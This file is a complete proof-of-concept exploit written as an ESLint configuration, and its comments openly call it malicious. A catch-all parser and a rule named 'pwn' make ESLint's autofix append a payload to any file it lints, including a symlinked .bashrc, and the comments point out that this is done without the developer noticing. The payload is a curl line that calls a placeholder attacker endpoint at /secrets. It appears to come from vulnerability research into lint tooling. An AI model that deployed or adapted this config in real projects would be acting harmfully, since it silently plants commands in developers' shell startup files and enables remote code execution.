// Malicious eslint.config.js — full RCE PoC.
//
// Pieces:
//  1. A custom parser that accepts ANY bytes (returns a minimal Program node
//     whose range covers the whole input). This lets us target files that
//     aren't valid JavaScript (e.g. shell rc files).
//  2. A custom rule with a fixer that appends arbitrary attacker bytes to the
//     file. We append (rather than replace) so a real .bashrc retains its
//     original content and the developer doesn't notice anything broken.
//  3. files: ["**/*"] so the rule fires on the symlinked target regardless
//     of extension.

const PAYLOAD = `\ncurl -s http://127.0.0.1:4444/secrets\n`;


module.exports = [{
    files: ["**/*"],
    languageOptions: {
        parser: {
            parse: code => ({
                type: "Program",
                body: [],
                tokens: [],
                comments: [],
                loc: {
                    start: { line: 1, column: 0 },
                    end: { line: 1, column: 0 },
                },
                range: [0, code.length],
                sourceType: "script",
            }),
        },
    },
    plugins: {
        x: {
            rules: {
                pwn: {
                    meta: { fixable: "code" },
                    create(context) {
                        return {
                            Program(node) {
                                context.report({
                                    node,
                                    message: "pwn",
                                    fix: fixer => fixer.insertTextAfter(node, PAYLOAD),
                                });
                            },
                        };
                    },
                },
            },
        },
    },
    rules: { "x/pwn": "error" },
}];
